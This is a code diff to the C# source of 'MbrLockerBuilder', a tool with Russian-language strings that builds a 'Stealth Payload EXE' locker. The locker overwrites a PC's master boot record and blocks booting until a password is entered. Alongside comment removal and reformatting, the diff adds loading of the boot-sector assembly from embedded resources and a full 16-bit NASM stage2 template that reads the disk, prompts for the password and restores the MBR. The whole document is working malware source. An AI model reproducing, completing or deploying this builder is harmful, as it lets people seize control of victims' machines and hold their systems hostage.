@@ -278,12 +278,10 @@ namespace MbrLockerBuilder
                     int x = 20;
                     int y = 20;
 
-                    // Рамка
                     string border = "========================================";
                     g.DrawString(border, font, brush, x, y);
                     y += 20;
 
-                    // Заголовок
                     string titleLine = "     " + title + "     ";
                     g.DrawString(titleLine, font, brush, x, y);
                     y += 20;
@@ -291,7 +289,6 @@ namespace MbrLockerBuilder
                     g.DrawString(border, font, brush, x, y);
                     y += 25;
 
-                    // Текст
                     string[] bodyLines = body.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                     foreach (string line in bodyLines)
                     {
@@ -314,7 +311,6 @@ namespace MbrLockerBuilder
                     y += 5;
                     g.DrawString("Password: ", font, brush, x, y);
 
-                    // ОТОБРАЖАЕМ РЕАЛЬНЫЙ ПАРОЛЬ (без звездочек)
                     string visiblePassword = password;
                     SizeF passSize = g.MeasureString(visiblePassword, font);
                     g.DrawString(visiblePassword, font, brush, x + 110, y);
@@ -361,7 +357,6 @@ namespace MbrLockerBuilder
         {
             try
             {
-                // Проверка на русский в пароле
                 if (ContainsRussian(this.txtPassword.Text))
                 {
                     DialogResult result = MessageBox.Show(
@@ -425,10 +420,7 @@ namespace MbrLockerBuilder
                 int totalSectors = 16;
                 byte[] fullImage = new byte[512 * totalSectors];
                 
-                // Копируем MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
-                
-                // Копируем Stage2 (сектор 3)
                 Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
                 
                 // ============================================================
@@ -516,12 +508,12 @@ namespace MbrLockerBuilder
                 this.saveFileDialog.Title = "Сохранить Stealth Payload EXE";
                 this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                 if (this.saveFileDialog.ShowDialog() == DialogResult.OK)
-{
-    File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
-    this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
+                {
+                    File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
+                    this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
 
-    MessageBox.Show("Mbr locker создан!", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
-}
+                    MessageBox.Show("Mbr locker создан!", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
                 else
                 {
                     this.lblStatus.Text = "Отменено";
@@ -556,12 +548,34 @@ namespace MbrLockerBuilder
                 throw new Exception("NASM Error: " + nasm.StandardError.ReadToEnd());
         }
 
+        // ============================================================
+        // НОВЫЕ МЕТОДЫ ДЛЯ ЗАГРУЗКИ ASM ИЗ РЕСУРСОВ
+        // ============================================================
+
         private string GenerateMBR()
         {
+            // 1. Пробуем загрузить из встроенных ресурсов (внутри EXE)
+            try
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.mbr.asm"))
+                {
+                    if (stream != null)
+                    {
+                        using (StreamReader reader = new StreamReader(stream))
+                        {
+                            return reader.ReadToEnd();
+                        }
+                    }
+                }
+            }
+            catch { }
+
+            // 2. Если не вышло — ищем в папке locker (для отладки)
             string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
             if (File.Exists(localPath))
                 return File.ReadAllText(localPath);
 
+            // 3. Запасной вариант (встроенный шаблон)
             return @"
 BITS 16
 ORG 0x7C00
@@ -576,7 +590,6 @@ start:
     mov sp, 0x7C00
     sti
 
-    ; Загружаем Stage2 из сектора 3 (6 секторов: 3-8)
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x8000
@@ -620,17 +633,230 @@ dw 0xAA55";
 
         private string GenerateStage2()
         {
-            string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "stage2.asm");
-            string template;
-            if (File.Exists(localPath))
-                template = File.ReadAllText(localPath);
-            else
-                template = File.ReadAllText("locker/stage2.asm");
+            string template = null;
+
+            // 1. Пробуем загрузить из встроенных ресурсов (внутри EXE)
+            try
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.stage2.asm"))
+                {
+                    if (stream != null)
+                    {
+                        using (StreamReader reader = new StreamReader(stream))
+                        {
+                            template = reader.ReadToEnd();
+                        }
+                    }
+                }
+            }
+            catch { }
+
+            // 2. Если не вышло — ищем в папке locker (для отладки)
+            if (string.IsNullOrEmpty(template))
+            {
+                string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "stage2.asm");
+                if (File.Exists(localPath))
+                    template = File.ReadAllText(localPath);
+            }
+
+            // 3. Если всё равно пусто — используем запасной шаблон
+            if (string.IsNullOrEmpty(template))
+            {
+                template = @"
+BITS 16
+ORG 0x8000
+
+start_stage2:
+    mov ax, 0x0003
+    int 0x10
+
+    mov ah, 0x06
+    mov al, 0
+    mov bh, 0x00
+    mov cx, 0
+    mov dx, 0x184F
+    int 0x10
+
+    mov ax, 0x0A00
+    int 0x10
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x9000
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 4
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    mov si, 0x9000
+    call print
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x9200
+    mov ah, 0x02
+    mov al, 2
+    mov ch, 0
+    mov cl, 5
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    mov si, 0x9200
+    call print
+
+    mov si, msg_prompt
+    call print
+
+password_loop:
+    call get_password
+    call check_password
+    cmp byte [password_ok], 1
+    je restore_and_boot
+    
+    mov si, msg_wrong
+    call print
+    jmp password_loop
+
+load_error:
+    mov si, msg_error
+    call print
+    jmp hang
+
+restore_and_boot:
+    call restore_mbr
+    jmp load_os
+
+restore_mbr:
+    pusha
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 2
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc .error
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x03
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+.error:
+    popa
+    ret
+
+load_os:
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jmp 0x0000:0x7C00
+
+print:
+    lodsb
+    or al, al
+    jz .done
+    mov ah, 0x0E
+    int 0x10
+    jmp print
+.done:
+    ret
+
+get_password:
+    mov di, buffer
+    mov cx, 64
+.loop:
+    xor ax, ax
+    int 0x16
+    cmp al, 0x0D
+    je .done
+    cmp al, 0x08
+    je .backspace
+    cmp di, buffer + 64
+    je .loop
+    stosb
+    mov ah, 0x0E
+    mov al, [di - 1]
+    int 0x10
+    jmp .loop
+.backspace:
+    cmp di, buffer
+    je .loop
+    dec di
+    mov ah, 0x0E
+    mov al, 0x08
+    int 0x10
+    mov al, ' '
+    int 0x10
+    mov al, 0x08
+    int 0x10
+    jmp .loop
+.done:
+    mov byte [di], 0
+    ret
+
+check_password:
+    mov si, buffer
+    mov di, password
+.compare:
+    lodsb
+    or al, al
+    jz .check_end
+    cmpsb
+    jne .fail
+    jmp .compare
+.check_end:
+    cmp byte [di], 0
+    jne .fail
+    mov byte [password_ok], 1
+.fail:
+    ret
+
+hang:
+    cli
+    hlt
+    jmp hang
+
+msg_prompt:
+    db 13,10,'Password: ',0
+msg_wrong:
+    db 13,10,'Wrong password!',13,10,0
+msg_error:
+    db 'Load error!',0
+
+password:
+    db {PASSWORD_HEX}
+
+buffer:
+    times 64 db 0
+password_ok:
+    db 0";
+            }
 
             string password = this.txtPassword.Text.Trim();
             if (string.IsNullOrEmpty(password)) password = "admin";
 
-            // Пароль в HEX
             string passwordHex;
             if (ContainsRussian(password))
             {
@@ -645,7 +871,6 @@ dw 0xAA55";
 
             template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
 
-            // Цвета
             string textColor = "0A";
             switch (this.cmbTextColor.SelectedIndex)
             {
